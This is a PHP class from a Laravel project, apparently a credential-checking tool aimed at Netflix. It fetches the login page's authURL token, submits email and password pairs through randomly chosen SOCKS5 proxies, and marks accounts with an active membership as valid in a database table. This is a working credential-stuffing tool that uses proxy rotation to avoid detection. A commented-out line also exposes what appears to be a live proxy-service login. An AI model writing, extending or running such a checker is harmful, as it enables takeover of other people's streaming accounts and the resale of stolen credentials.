<?php

namespace App\AccountCheckers;

use App\ReplacementAccount;
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use Illuminate\Support\Facades\Log;
use File;

class NetflixChecker
{

    public $httpClient;
    public $proxy;



    public function __construct()
    { 
        $jar = new CookieJar;

        $getproxy = File::get(storage_path('proxy.txt'));
      
        //$getproxy = file_get_contents('http://moxyproxy.pw/key/lXYOwRzOYAFFlcwZkEfNPoiRZWyCQQnv/list/');
        $your_array = explode(PHP_EOL, $getproxy);

        
        //$your_array = explode(',', $getproxy);
        $proxy = $your_array[array_rand($your_array)];
        $lastProxy = 'socks5://' . $proxy;


        

        $this->httpClient = new Client([
            'cookies' => $jar,
            'proxy' => $lastProxy,
            //'proxy' => ['https' => $proxy],
            //'proxy' => "http://ThePharmac-cc-us:nf3GN0i@gw.rainproxy.io:5959",
            //'proxy' => ['https' => 'us.proxiware.com:2000'],
            'timeout' => 20,
        ]);

        //Log::info($proxy);


      


      
    }

    public function checker($email, $password){
        
        $auth = $this->getAuth();
        $login = $this->login($email, $password, $auth);

        return $login;
    }
    

    public function getAuth()
    {
        try {



            $promise = $this->httpClient->request('GET', 'https://www.netflix.com/es-en/login', [
                'timeout' => 20,
                'headers' => [
                    'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
                    'Cache-Control'     => 'max-age=0',
                    'Referer'      => 'https://www.netflix.com/co/Login'
                ]
            ]);
            $data =  $promise->getBody()->getContents();


            $expA = explode('name="authURL" value="', $data);
            $expB = explode('"/>', $expA[1]);
            $auth = $expB[0];


            if (!empty($auth)) {
                return $auth;
            }
            else {
                throw new ConnectException;
            }

            return $auth;
        } catch (ConnectException $e) {

            echo "test";
        } catch (Exception $e) {
            echo 'Caught exception: ',  $e->getResponse(), "\n";
            echo get_class($e);
        }
    }

    public function login($email, $password, $auth)
    {

        try {

            $post = $this->httpClient->request('POST', 'https://www.netflix.com/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2FYourAccount', [
                'headers' => [
                    'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
                    'Cache-Control'     => 'max-age=0',
                    'Referer'      => 'https://www.netflix.com/es-en/login'
                ],
                'timeout' => 20,
                'form_params' => [
                    'userLoginId' => $email,
                    'password' => $password,
                    'authURL' => $auth,
                    'rememberMe' => 'true',
                    'flow' => 'websiteSignUp',
                    'mode' => 'login',
                    'action' => 'loginAction',
                    'withFields' => 'rememberMe,nextPage,userLoginId,password',
                    'nextPage' => '',
                    'showPassword' => '',
                ]
            ]);
    
            $data = $post->getBody()->getContents();
    
            if (strpos($data, "\"messageName\":\"PAYMENT_FAILURE_UMA\"")) {

                return "Invalid";
            } 
            else if  (strpos($data, "\"membershipStatus\":\"CURRENT_MEMBER\"")) {
                ReplacementAccount::where('email', $email)->update(['was_valid' => '1']);
                return "Valid";
            }
            else {
                //ReplacementAccount::where('email', $email)->delete();
                return "Invalid";
            }

        } catch (ConnectException $e) {
            return $e->getResponse();

        } catch (Exception $e) {
            return get_class($e);
        }

       
    }
}